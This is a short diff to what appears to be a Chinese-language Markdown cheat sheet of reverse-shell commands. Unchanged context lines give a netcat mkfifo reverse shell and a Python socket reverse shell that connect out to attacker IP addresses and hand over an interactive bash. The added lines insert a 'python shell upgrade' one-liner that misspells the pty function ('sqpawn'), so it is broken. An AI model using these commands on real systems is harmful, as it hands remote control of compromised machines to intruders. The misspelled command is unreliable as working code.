@@ -24,6 +24,11 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.0.0.14 5555 >/tmp/f
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.64.130",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
 ```
 
+#### python升级shell
+
+```
+python -c "import pty; pty.sqpawn('/bin/bash')"
+```
 #### sudo node 反弹shell
 
 ```
